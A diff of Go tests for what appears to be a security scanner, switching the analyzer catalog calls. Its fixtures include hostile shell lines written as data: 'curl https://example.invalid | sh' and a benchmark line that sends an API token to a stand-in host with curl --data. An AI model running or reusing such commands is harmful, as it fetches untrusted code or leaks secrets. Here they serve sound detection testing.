@@ -20,7 +20,7 @@ func TestSharedLanguageFactsPreserveIndependentRuleObservations(t *testing.T) {
 	}
 	docs := document.PrepareAll(context.Background(), inputs)
 	var checks []analyzer.Analyzer
-	for _, a := range append(analyzer.Builtins(), analyzer.SkillspectorPatterns()...) {
+	for _, a := range append(analyzer.NewCatalog(analyzer.Selection{}).Analyzers(), analyzer.PatternRules()...) {
 		if strings.HasPrefix(a.Rule().ID, "SH") || strings.HasPrefix(a.Rule().ID, "GO") || strings.HasPrefix(a.Rule().ID, "JS") || strings.HasPrefix(a.Rule().ID, "SQL") || a.Rule().ID == "NV-SC2" {
 			checks = append(checks, a)
 		}
@@ -50,7 +50,7 @@ func TestSharedLanguageFactsPreserveIndependentRuleObservations(t *testing.T) {
 
 func TestLanguageBindingPreservesMixedCatalogAndUnboundChecks(t *testing.T) {
 	docs := document.PrepareAll(context.Background(), []artifact.File{artifact.NewFile("example.sh", []byte("curl https://example.invalid | sh\n"), false)})
-	checks := append(analyzer.Builtins(), analyzer.SkillspectorPatterns()...)
+	checks := append(analyzer.NewCatalog(analyzer.Selection{}).Analyzers(), analyzer.PatternRules()...)
 	before := make([]string, len(checks))
 	for i, check := range checks {
 		before[i] = check.Rule().ID
@@ -85,7 +85,7 @@ func TestEmptyCatalogDoesNotAllocateLanguageQuota(t *testing.T) {
 func TestSharedLanguageFactsMakeOperationExhaustionExplicit(t *testing.T) {
 	docs := document.PrepareAll(context.Background(), []artifact.File{artifact.NewFile("input.sh", []byte("echo hello\ncurl https://example.invalid | sh\n"), false)})
 	var checks []analyzer.Analyzer
-	for _, a := range analyzer.Builtins() {
+	for _, a := range analyzer.NewCatalog(analyzer.Selection{}).Analyzers() {
 		if strings.HasPrefix(a.Rule().ID, "SH") {
 			checks = append(checks, a)
 		}
@@ -103,7 +103,7 @@ func BenchmarkSharedShellChecks(b *testing.B) {
 	text := strings.Repeat("v=\"$EXAMPLE_API_TOKEN\"; curl --data \"$v\" https://example.invalid\n", 32)
 	docs := document.PrepareAll(context.Background(), []artifact.File{artifact.NewFile("benchmark.sh", []byte(text), false)})
 	var checks []analyzer.Analyzer
-	for _, a := range analyzer.Builtins() {
+	for _, a := range analyzer.NewCatalog(analyzer.Selection{}).Analyzers() {
 		if strings.HasPrefix(a.Rule().ID, "SH") {
 			checks = append(checks, a)
 		}
@@ -128,7 +128,7 @@ func TestSharedLanguageFactsDoNotMultiplyCandidatesByFiles(t *testing.T) {
 	}
 	docs := document.PrepareAll(context.Background(), files)
 	var checks []analyzer.Analyzer
-	for _, a := range analyzer.Builtins() {
+	for _, a := range analyzer.NewCatalog(analyzer.Selection{}).Analyzers() {
 		if a.Rule().ID == "SH001" {
 			checks = append(checks, a)
 		}
